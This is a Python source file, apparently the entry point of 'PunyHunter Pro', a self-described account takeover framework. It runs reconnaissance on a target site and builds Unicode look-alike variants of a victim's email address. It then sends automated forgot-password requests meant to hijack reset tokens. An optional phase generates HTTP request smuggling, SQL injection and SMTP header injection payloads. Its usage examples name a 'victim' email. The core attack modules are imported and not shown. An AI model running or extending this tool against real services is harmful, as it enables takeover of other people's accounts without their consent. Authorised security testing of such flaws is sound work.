#!/usr/bin/env python3
# punyhunter_pro.py - PunyHunter Pro v2.0.0
# Elite Puny-Code Account Takeover Framework
# Developed for Red Team Operations

import asyncio
import argparse
import sys
import os
import json
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, TaskID
from rich.table import Table
from rich import box

# Import all modules
try:
    from modules.character_discovery import CharacterDiscovery
    from modules.reconnaissance import TargetRecon
    from modules.payload_generator import PayloadGenerator
    from modules.attack_automation import AttackAutomation
    from modules.advanced_evasion import AdvancedEvasion
    from modules.reporting import ReportGenerator
    from config.settings import Settings
except ImportError as e:
    print(f"❌ Module import error: {e}")
    print("Please ensure all modules are properly installed.")
    sys.exit(1)

class PunyHunterPro:
    def __init__(self):
        self.console = Console()
        self.version = "2.0.0"
        self.banner = r"""
╔═══════════════════════════════════════════════════════════════════════╗
║  ____                       _   _             _                       ║
║ |  _ \\ _   _ _ __  _   _    | | | |_   _ _ __ | |_ ___ _ __              ║
║ | |_) | | | | '_ \| | | |   | |_| | | | | '_ \| __/ _ \ '__|             ║
║ |  __/| |_| | | | | |_| |   |  _  | |_| | | | | ||  __/ |                ║
║ |_|    \__,_|_| |_|\__, |   |_| |_|\__,_|_| |_|\__\___|_|                ║
║                   |___/                    Pro v2.0.0                   ║
║                                                                         ║
║          🎯 Elite Puny-Code Account Takeover Framework 🎯              ║
║               🔥 Developed for Red Team Operations 🔥                   ║
║                                                                         ║
║  Features: Unicode Fuzzing | Advanced Evasion | Professional Reports   ║
║           Character Discovery | Attack Automation | Elite Techniques    ║
╚═══════════════════════════════════════════════════════════════════════╝
"""
        
        # Initialize modules
        self.char_discovery = None
        self.recon = None
        self.payload_gen = None
        self.attack_automation = None
        self.advanced_evasion = None
        self.reporter = None
        self.settings = None
        
        # Results storage
        self.scan_results = {
            'character_discovery': [],
            'reconnaissance': {},
            'payload_generation': [],
            'attack_execution': [],
            'evasion_tests': [],
            'metadata': {
                'start_time': datetime.now(),
                'target': '',
                'scan_id': f"PUNY-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
            }
        }
        
    def display_banner(self):
        """Display the tool banner"""
        self.console.print(self.banner, style="bold red")
        self.console.print(f"🚀 Starting PunyHunter Pro Elite Framework", style="bold green")
        self.console.print(f"⏰ Scan ID: {self.scan_results['metadata']['scan_id']}", style="bold yellow")
        print()
        
    def initialize_modules(self):
        """Initialize all required modules"""
        try:
            self.settings = Settings()
            self.char_discovery = CharacterDiscovery()
            self.recon = TargetRecon()
            self.payload_gen = PayloadGenerator([])  # Will be updated with discovered chars
            self.attack_automation = AttackAutomation()
            self.advanced_evasion = AdvancedEvasion()
            self.reporter = ReportGenerator()
            
            self.console.print("✅ All modules initialized successfully", style="bold green")
            
        except Exception as e:
            self.console.print(f"❌ Module initialization failed: {e}", style="bold red")
            sys.exit(1)
    
    async def phase_1_character_discovery(self):
        """Phase 1: Advanced Character Discovery"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("📊 PHASE 1: ADVANCED CHARACTER DISCOVERY", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        discovered_chars = []
        
        # MySQL Character Discovery
        self.console.print("🔍 Testing MySQL character confusion...", style="yellow")
        try:
            mysql_config = self.settings.config['database_settings']['mysql']
            mysql_chars = await self.char_discovery.mysql_fuzzer(mysql_config)
            discovered_chars.extend(mysql_chars)
            
            if mysql_chars:
                self.console.print(f"✅ Found {len(mysql_chars)} vulnerable MySQL characters", style="green")
                
                # Display sample results
                table = Table(title="Sample MySQL Character Confusion Results")
                table.add_column("Unicode", style="cyan")
                table.add_column("Character", style="magenta")
                table.add_column("Target", style="green")
                table.add_column("Hex", style="yellow")
                
                for char in mysql_chars[:5]:  # Show first 5
                    table.add_row(
                        str(char.get('unicode', 'N/A')),
                        char.get('char', 'N/A'),
                        char.get('target', 'N/A'),
                        char.get('hex', 'N/A')
                    )
                    
                self.console.print(table)
            else:
                self.console.print("⚠️ No MySQL server connection available", style="yellow")
                
        except Exception as e:
            self.console.print(f"⚠️ MySQL discovery error: {e}", style="yellow")
        
        # PostgreSQL Character Discovery
        self.console.print("🔍 Testing PostgreSQL character confusion...", style="yellow")
        try:
            postgres_config = self.settings.config['database_settings']['postgresql']
            postgres_chars = await self.char_discovery.postgresql_fuzzer(postgres_config)
            discovered_chars.extend(postgres_chars)
            
            if postgres_chars:
                self.console.print(f"✅ Found {len(postgres_chars)} vulnerable PostgreSQL characters", style="green")
            else:
                self.console.print("⚠️ No PostgreSQL server connection available", style="yellow")
                
        except Exception as e:
            self.console.print(f"⚠️ PostgreSQL discovery error: {e}", style="yellow")
        
        # Add default known vulnerable characters if no DB connection
        if not discovered_chars:
            self.console.print("📋 Using built-in vulnerable character database...", style="yellow")
            discovered_chars = [
                {'unicode': 1072, 'char': 'а', 'target': 'a', 'hex': '0x430', 'database': 'builtin'},
                {'unicode': 1077, 'char': 'е', 'target': 'e', 'hex': '0x435', 'database': 'builtin'},
                {'unicode': 1086, 'char': 'о', 'target': 'o', 'hex': '0x43e', 'database': 'builtin'},
                {'unicode': 1088, 'char': 'р', 'target': 'p', 'hex': '0x440', 'database': 'builtin'},
                {'unicode': 1110, 'char': 'і', 'target': 'i', 'hex': '0x456', 'database': 'builtin'},
            ]
            
        self.scan_results['character_discovery'] = discovered_chars
        
        # Save character discovery results
        await self.char_discovery.save_results(discovered_chars, f"results/{self.scan_results['metadata']['scan_id']}_characters")
        
        self.console.print(f"✅ Phase 1 Complete: {len(discovered_chars)} characters discovered", style="bold green")
        return discovered_chars
    
    async def phase_2_reconnaissance(self, target):
        """Phase 2: Target Reconnaissance"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("🔍 PHASE 2: TARGET RECONNAISSANCE", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        # Comprehensive recon
        recon_results = await self.recon.comprehensive_recon(target)
        self.scan_results['reconnaissance'] = recon_results
        
        # Display reconnaissance summary
        self.display_recon_summary(recon_results)
        
        # Save recon results
        await self.recon.save_results(recon_results, f"results/{self.scan_results['metadata']['scan_id']}")
        
        self.console.print("✅ Phase 2 Complete: Target reconnaissance finished", style="bold green")
        return recon_results
    
    def display_recon_summary(self, recon_results):
        """Display reconnaissance results summary"""
        try:
            results = recon_results.get('results', {})
            
            # Technology summary
            tech = results.get('technology', {})
            if tech:
                tech_table = Table(title="🔧 Technology Stack Detected", box=box.ROUNDED)
                tech_table.add_column("Category", style="cyan")
                tech_table.add_column("Technologies", style="green")
                
                for category, items in tech.items():
                    if items and category != 'error':
                        tech_table.add_row(category.replace('_', ' ').title(), ', '.join(map(str, items)) if isinstance(items, list) else str(items))
                
                self.console.print(tech_table)
            
            # Subdomains summary
            subdomains = results.get('subdomains', [])
            if subdomains:
                self.console.print(f"🌐 Found {len(subdomains)} subdomains", style="green")
                for i, subdomain in enumerate(subdomains[:5], 1):
                    self.console.print(f"  {i}. {subdomain}", style="yellow")
                if len(subdomains) > 5:
                    self.console.print(f"  ... and {len(subdomains) - 5} more", style="dim")
            
            # Open ports summary
            ports = results.get('open_ports', [])
            if ports:
                self.console.print(f"🔌 Found {len(ports)} open ports: {', '.join(map(str, ports))}", style="green")
                
        except Exception as e:
            self.console.print(f"⚠️ Error displaying recon summary: {e}", style="yellow")
    
    async def phase_3_payload_generation(self, target_email, discovered_chars):
        """Phase 3: Advanced Payload Generation"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("🚀 PHASE 3: ADVANCED PAYLOAD GENERATION", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        # Initialize payload generator with discovered characters
        self.payload_gen = PayloadGenerator(discovered_chars)
        
        payloads = []
        
        if target_email:
            self.console.print(f"📧 Generating email variants for: {target_email}", style="yellow")
            
            # Generate email variants
            email_variants = await self.payload_gen.generate_email_variants(target_email)
            payloads.extend(email_variants)
            
            # Display sample variants
            if email_variants:
                variant_table = Table(title="🎯 Generated Email Variants (Sample)", box=box.ROUNDED)
                variant_table.add_column("Original Character", style="red")
                variant_table.add_column("Puny Character", style="green")
                variant_table.add_column("Email Variant", style="cyan")
                variant_table.add_column("Unicode Point", style="yellow")
                
                for variant in email_variants[:10]:  # Show first 10
                    if 'original_char' in variant:
                        variant_table.add_row(
                            variant.get('original_char', 'N/A'),
                            variant.get('puny_char', 'N/A'),
                            variant.get('email', 'N/A'),
                            str(variant.get('unicode_point', 'N/A'))
                        )
                
                self.console.print(variant_table)
                self.console.print(f"✅ Generated {len(email_variants)} email variants", style="green")
            else:
                self.console.print("⚠️ No email variants generated", style="yellow")
                
        # Generate WAF bypass payloads
        if payloads:
            self.console.print("🛡️ Generating WAF bypass variants...", style="yellow")
            for payload in payloads[:5]:  # Process first 5 for demo
                base_email = payload.get('email', '')
                if base_email:
                    bypass_variants = await self.payload_gen.generate_waf_bypass_payloads(base_email)
                    payload['waf_bypass_variants'] = bypass_variants
                    
            self.console.print(f"✅ Generated WAF bypass variants for payloads", style="green")
        
        self.scan_results['payload_generation'] = payloads
        
        self.console.print(f"✅ Phase 3 Complete: {len(payloads)} payloads generated", style="bold green")
        return payloads
    
    async def phase_4_attack_execution(self, target, payloads):
        """Phase 4: Attack Automation & Execution"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("⚡ PHASE 4: ATTACK EXECUTION", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        attack_results = []
        
        if payloads:
            self.console.print(f"🎯 Executing forgot password attacks against: {target}", style="yellow")
            
            # Progress tracking
            with Progress() as progress:
                task = progress.add_task("🚀 Attacking...", total=len(payloads))
                
                # Execute attacks in batches to avoid overwhelming the target
                batch_size = 5
                for i in range(0, len(payloads), batch_size):
                    batch = payloads[i:i + batch_size]
                    
                    try:
                        batch_results = await self.attack_automation.forgot_password_attack(target, batch)
                        attack_results.extend(batch_results)
                        
                        progress.update(task, advance=len(batch))
                        
                        # Small delay between batches
                        await asyncio.sleep(1)
                        
                    except Exception as e:
                        self.console.print(f"⚠️ Batch attack error: {e}", style="yellow")
                        continue
            
            # Display attack results
            if attack_results:
                attack_table = Table(title="⚡ Attack Results", box=box.ROUNDED)
                attack_table.add_column("Email Variant", style="cyan")
                attack_table.add_column("Status Code", style="green")
                attack_table.add_column("Result", style="yellow")
                
                for result in attack_results[:10]:  # Show first 10
                    variant = result.get('email_variant', {})
                    email = variant.get('email', 'N/A')
                    status = str(result.get('response_code', 'N/A'))
                    success = "✅ SUCCESS" if result.get('response_code') == 200 else "❌ FAILED"
                    
                    attack_table.add_row(email, status, success)
                
                self.console.print(attack_table)
                self.console.print(f"✅ Found {len(attack_results)} potential vulnerabilities", style="green")
            else:
                self.console.print("ℹ️ No successful attacks detected", style="blue")
                
        else:
            self.console.print("⚠️ No payloads available for attack execution", style="yellow")
        
        # Format results for reporting
        formatted_results = []
        for result in attack_results:
            formatted_result = {
                'title': 'Puny-Code Email Confusion Vulnerability',
                'severity': 'High' if result.get('response_code') == 200 else 'Medium',
                'target': target,
                'parameter': 'email',
                'attack_vector': 'Unicode character substitution',
                'description': f"Password reset functionality accepts puny-code email variant: {result.get('email_variant', {}).get('email', 'N/A')}",
                'impact': 'Potential account takeover through password reset token hijacking',
                'evidence': f"HTTP {result.get('response_code', 'N/A')} response received for email variant",
                'cvss_score': '8.1 (High)' if result.get('response_code') == 200 else '6.5 (Medium)',
                'remediation': 'Implement consistent Unicode normalization across all email handling components'
            }
            formatted_results.append(formatted_result)
        
        # Add informational result if no vulnerabilities found
        if not formatted_results:
            formatted_results.append({
                'title': 'Puny-Code Assessment Complete - No Immediate Vulnerabilities',
                'severity': 'Info',
                'target': target,
                'parameter': 'email',
                'attack_vector': 'Character confusion testing',
                'description': 'Comprehensive puny-code character testing completed. Target appears to handle Unicode characters correctly.',
                'impact': 'No immediate security impact identified',
                'evidence': 'All test payloads returned expected responses indicating proper input validation',
                'cvss_score': '0.0 (Informational)',
                'remediation': 'Continue implementing security best practices and regular assessments'
            })
        
        self.scan_results['attack_execution'] = formatted_results
        
        self.console.print(f"✅ Phase 4 Complete: {len(attack_results)} attacks executed", style="bold green")
        return formatted_results
    
    async def phase_5_advanced_evasion(self, target, payloads):
        """Phase 5: Advanced Evasion Testing"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("🥷 PHASE 5: ADVANCED EVASION TESTING", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        evasion_results = []
        
        if payloads:
            sample_payload = payloads[0].get('email', 'test@example.com')
            
            # HTTP Request Smuggling
            self.console.print("🔄 Testing HTTP request smuggling...", style="yellow")
            try:
                smuggling_payloads = await self.advanced_evasion.http_request_smuggling(target, sample_payload)
                evasion_results.extend([{
                    'technique': 'HTTP Request Smuggling',
                    'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                    'status': 'Generated'
                } for payload in smuggling_payloads])
                
                self.console.print(f"✅ Generated {len(smuggling_payloads)} smuggling variants", style="green")
            except Exception as e:
                self.console.print(f"⚠️ Smuggling test error: {e}", style="yellow")
            
            # SQL Injection via Puny
            self.console.print("💉 Testing SQL injection via puny characters...", style="yellow")
            try:
                sqli_payloads = await self.advanced_evasion.sql_injection_via_puny(sample_payload)
                evasion_results.extend([{
                    'technique': 'SQL Injection',
                    'payload': payload,
                    'status': 'Generated'
                } for payload in sqli_payloads[:5]])  # Limit for display
                
                self.console.print(f"✅ Generated {len(sqli_payloads)} SQLi variants", style="green")
            except Exception as e:
                self.console.print(f"⚠️ SQLi test error: {e}", style="yellow")
            
            # SMTP Header Injection
            self.console.print("📨 Testing SMTP header injection...", style="yellow")
            try:
                smtp_payloads = await self.advanced_evasion.smtp_header_injection(sample_payload)
                evasion_results.extend([{
                    'technique': 'SMTP Header Injection',
                    'payload': payload,
                    'status': 'Generated'
                } for payload in smtp_payloads])
                
                self.console.print(f"✅ Generated {len(smtp_payloads)} SMTP injection variants", style="green")
            except Exception as e:
                self.console.print(f"⚠️ SMTP injection test error: {e}", style="yellow")
            
            # Display evasion summary
            if evasion_results:
                evasion_table = Table(title="🥷 Advanced Evasion Techniques", box=box.ROUNDED)
                evasion_table.add_column("Technique", style="red")
                evasion_table.add_column("Payload Preview", style="yellow")
                evasion_table.add_column("Status", style="green")
                
                for result in evasion_results[:10]:  # Show first 10
                    evasion_table.add_row(
                        result['technique'],
                        result['payload'][:50] + '...' if len(result['payload']) > 50 else result['payload'],
                        result['status']
                    )
                
                self.console.print(evasion_table)
        
        self.scan_results['evasion_tests'] = evasion_results
        
        self.console.print(f"✅ Phase 5 Complete: {len(evasion_results)} evasion techniques tested", style="bold green")
        return evasion_results
    
    async def phase_6_reporting(self, output_prefix):
        """Phase 6: Comprehensive Reporting"""
        self.console.print("\n" + "="*60, style="bold blue")
        self.console.print("📋 PHASE 6: COMPREHENSIVE REPORTING", style="bold blue")
        self.console.print("="*60, style="bold blue")
        
        # Compile all results
        all_findings = self.scan_results['attack_execution']
        
        # Update metadata
        self.scan_results['metadata']['end_time'] = datetime.now()
        self.scan_results['metadata']['duration'] = str(self.scan_results['metadata']['end_time'] - self.scan_results['metadata']['start_time'])
        
        # Generate all report formats
        self.console.print("📄 Generating PDF report...", style="yellow")
        self.console.print("📊 Generating JSON report...", style="yellow")
        self.console.print("📈 Generating CSV report...", style="yellow")
        self.console.print("📝 Generating text report...", style="yellow")
        
        try:
            await self.reporter.generate_all_reports(all_findings, output_prefix)
            
            # Generate scan summary report
            summary_file = f"{output_prefix}_scan_summary.json"
            with open(summary_file, 'w', encoding='utf-8') as f:
                json.dump(self.scan_results, f, indent=2, default=str, ensure_ascii=False)
            
            self.console.print(f"✅ Scan summary saved: {summary_file}", style="green")
            
        except Exception as e:
            self.console.print(f"⚠️ Reporting error: {e}", style="yellow")
        
        self.console.print("✅ Phase 6 Complete: All reports generated", style="bold green")
    
    def display_final_summary(self):
        """Display final scan summary"""
        self.console.print("\n" + "="*70, style="bold green")
        self.console.print("🎯 PUNYHUNTER PRO SCAN SUMMARY", style="bold green")
        self.console.print("="*70, style="bold green")
        
        # Create summary table
        summary_table = Table(title="📊 Scan Results Overview", box=box.DOUBLE_EDGE)
        summary_table.add_column("Component", style="cyan", width=25)
        summary_table.add_column("Results", style="green", width=15)
        summary_table.add_column("Status", style="yellow", width=20)
        
        # Add rows
        summary_table.add_row("Character Discovery", str(len(self.scan_results['character_discovery'])), "✅ Complete")
        summary_table.add_row("Target Reconnaissance", "1 target", "✅ Complete")
        summary_table.add_row("Payload Generation", str(len(self.scan_results['payload_generation'])), "✅ Complete")
        summary_table.add_row("Attack Execution", str(len(self.scan_results['attack_execution'])), "✅ Complete")
        summary_table.add_row("Evasion Testing", str(len(self.scan_results['evasion_tests'])), "✅ Complete")
        
        self.console.print(summary_table)
        
        # Display key findings
        findings = self.scan_results['attack_execution']
        high_risk = len([f for f in findings if f.get('severity') == 'High'])
        medium_risk = len([f for f in findings if f.get('severity') == 'Medium'])
        
        if high_risk > 0 or medium_risk > 0:
            self.console.print(f"🚨 SECURITY FINDINGS:", style="bold red")
            self.console.print(f"   High Risk: {high_risk}", style="red")
            self.console.print(f"   Medium Risk: {medium_risk}", style="yellow")
        else:
            self.console.print("✅ No immediate vulnerabilities detected", style="bold green")
        
        # Display scan metadata
        metadata = self.scan_results['metadata']
        self.console.print(f"\n📈 Scan completed in: {metadata.get('duration', 'N/A')}", style="blue")
        self.console.print(f"🆔 Scan ID: {metadata['scan_id']}", style="blue")
        self.console.print(f"🎯 Target: {metadata['target']}", style="blue")
        
        self.console.print("\n🎉 PunyHunter Pro scan completed successfully!", style="bold green")

# Main execution functions
async def run_cli_mode(args):
    """Run tool in CLI mode"""
    # Initialize PunyHunter Pro
    puny_hunter = PunyHunterPro()
    puny_hunter.display_banner()
    
    # Set target in metadata
    puny_hunter.scan_results['metadata']['target'] = args.target
    
    # Initialize modules
    puny_hunter.initialize_modules()
    
    # Create results directory
    os.makedirs('results', exist_ok=True)
    
    try:
        # Phase 1: Character Discovery
        discovered_chars = await puny_hunter.phase_1_character_discovery()
        
        # Phase 2: Target Reconnaissance
        recon_results = await puny_hunter.phase_2_reconnaissance(args.target)
        
        # Phase 3: Payload Generation
        payloads = await puny_hunter.phase_3_payload_generation(args.email, discovered_chars)
        
        # Phase 4: Attack Execution
        attack_results = await puny_hunter.phase_4_attack_execution(args.target, payloads)
        
        # Phase 5: Advanced Evasion (Optional)
        if args.advanced:
            evasion_results = await puny_hunter.phase_5_advanced_evasion(args.target, payloads)
        
        # Phase 6: Comprehensive Reporting
        output_prefix = args.output or f"results/punyhunter_{puny_hunter.scan_results['metadata']['scan_id']}"
        await puny_hunter.phase_6_reporting(output_prefix)
        
        # Display final summary
        puny_hunter.display_final_summary()
        
    except KeyboardInterrupt:
        puny_hunter.console.print("\n⚠️ Scan interrupted by user", style="yellow")
        sys.exit(0)
    except Exception as e:
        puny_hunter.console.print(f"\n❌ Scan error: {e}", style="red")
        sys.exit(1)

def run_gui_mode():
    """Launch GUI interface"""
    try:
        from modules.gui_interface import PunyHunterGUI
        gui = PunyHunterGUI()
        gui.root.mainloop()
    except ImportError:
        print("❌ GUI modules not available. Install tkinter: pip install tkinter")
        sys.exit(1)
    except Exception as e:
        print(f"❌ GUI error: {e}")
        sys.exit(1)

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="PunyHunter Pro v2.0.0 - Elite Puny-Code Account Takeover Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 punyhunter_pro.py --target https://example.com --email victim@example.com
  python3 punyhunter_pro.py --target https://example.com --email test@example.com --advanced
  python3 punyhunter_pro.py --gui
  python3 punyhunter_pro.py --target https://example.com --wordlist emails.txt --output scan_results
        """
    )
    
    # Main arguments
    parser.add_argument('--target', help='Target URL or domain (required for CLI mode)')
    parser.add_argument('--email', help='Target email for puny-code testing')
    parser.add_argument('--wordlist', help='Custom email wordlist file')
    parser.add_argument('--output', help='Output file prefix for reports')
    parser.add_argument('--config', help='Custom configuration file')
    
    # Mode selection
    parser.add_argument('--gui', action='store_true', help='Launch GUI interface')
    parser.add_argument('--advanced', action='store_true', help='Enable advanced evasion testing')
    
    # Optional features
    parser.add_argument('--proxy', help='Proxy server (http://proxy:port)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=1.0, help='Request delay in seconds (default: 1.0)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    # Scan modes
    parser.add_argument('--mode', choices=['discovery', 'recon', 'attack', 'full'], default='full',
                       help='Scan mode: discovery, recon, attack, or full (default: full)')
    
    # Output options
    parser.add_argument('--format', choices=['pdf', 'json', 'csv', 'txt', 'all'], default='all',
                       help='Report format (default: all)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.gui:
        # GUI mode
        run_gui_mode()
    else:
        # CLI mode - validate required arguments
        if not args.target:
            parser.error("--target is required for CLI mode")
            
        # Run CLI mode
        await run_cli_mode(args)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️ Tool interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)
